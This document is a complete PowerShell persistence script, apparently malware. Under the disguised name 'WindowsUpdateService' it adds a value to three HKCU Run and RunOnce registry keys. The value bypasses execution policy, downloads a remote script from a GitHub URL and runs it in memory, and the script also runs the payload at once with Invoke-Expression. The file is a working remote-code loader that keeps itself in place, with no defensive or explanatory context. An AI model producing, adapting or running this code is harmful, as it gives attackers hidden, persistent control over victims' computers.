# Registry Persistence with Existence Check
$regPaths = @(
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce", 
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"
)

$payload = "powershell -ep bypass -c `"[PowerShell]::Create().AddScript((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/h41th3m0x/NyxCore/refs/heads/main/autorun.ps1')).Invoke()`""
$regName = "WindowsUpdateService"

foreach ($path in $regPaths) {
    if (Test-Path $path) {
        # Check if value already exists
        $existingValue = Get-ItemProperty -Path $path -Name $regName -ErrorAction SilentlyContinue
        if (-not $existingValue) {
            Set-ItemProperty -Path $path -Name $regName -Value $payload -Force
        }
    }
}

Invoke-Expression $payload